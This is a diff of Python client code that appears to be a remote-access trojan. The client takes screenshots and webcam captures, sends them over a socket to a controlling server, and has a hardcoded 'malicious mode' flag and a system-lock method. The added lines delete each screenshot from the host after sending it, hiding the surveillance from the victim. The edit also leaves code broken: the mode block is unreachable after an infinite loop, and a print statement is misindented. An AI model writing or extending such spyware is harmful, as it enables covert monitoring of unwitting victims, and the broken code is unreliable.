@@ -40,14 +40,7 @@ class Client:
             self.client.send("MATCH".encode("utf-8"))
 
     def progress(self):
-        malorgood = "1"  #input("Enter 1 to run in malicious mode or 2 to run in virtuous mode: ")
-        if malorgood == "1":
-            print("Malicious mode enabled: ")
-            self.client.send("1".encode("utf-8"))
-        else:
-            print("Virtuous mode enabled: ")
-            self.client.send("2".encode("utf-8"))
-            self.confirmconnection()
+
         while True:
             input("Success - Reached the code loop")
             #self.sendHostInfo()
@@ -55,6 +48,15 @@ class Client:
             print("Capture complete")
             self.sendwebcam()
             input("Done")
+
+        malorgood = "1"  # input("Enter 1 to run in malicious mode or 2 to run in virtuous mode: ")
+        if malorgood == "1":
+            print("Malicious mode enabled: ")
+            self.client.send("1".encode("utf-8"))
+        else:
+            print("Virtuous mode enabled: ")
+            self.client.send("2".encode("utf-8"))
+            self.confirmconnection()
 
     def runrun(self, msg):
         obj = "failed"
@@ -150,15 +152,34 @@ class Client:
     def ssht(self):
         ss = mss()
         ss.shot(output='./logs/screen{}.png'.format(self.sscount))  # taking screenshot
+        # get & send file size
         picsize = os.path.getsize('./logs/screen{}.png'.format(self.sscount))
         self.client.send(str(picsize).encode())
         time.sleep(0.1)
+        # open, read and send file contents
         with open('./logs/screen{}.png'.format(self.sscount), 'rb') as screen:
             tosend = screen.read()
             self.client.send(tosend)  # sending actual file
-        # os.remove('./logs/screen{}.png'.format(self.screenshot_counter))  # removing file from host
+        os.remove('./logs/screen{}.png'.format(self.sscount))  # removing file from host
         self.sscount += 1
         print("SUCCESS")
+
+    def ssht_with(self):
+       with mss() as ss:
+            ss.shot(output='./logs/screen{}.png'.format(self.sscount))  # taking screenshot
+            # get & send file size
+            picsize = os.path.getsize('./logs/screen{}.png'.format(self.sscount))
+            self.client.send(str(picsize).encode())
+            time.sleep(0.1)
+            # open, read and send file contents
+            with open('./logs/screen{}.png'.format(self.sscount), 'rb') as screen:
+                tosend = screen.read()
+                self.client.send(tosend)  # sending actual file
+            os.remove('./logs/screen{}.png'.format(self.sscount))  # removing file from host
+            self.sscount += 1
+    print("SUCCESS")
+
+
 
     def locksystem(self):
         ## command = "-locksystem"
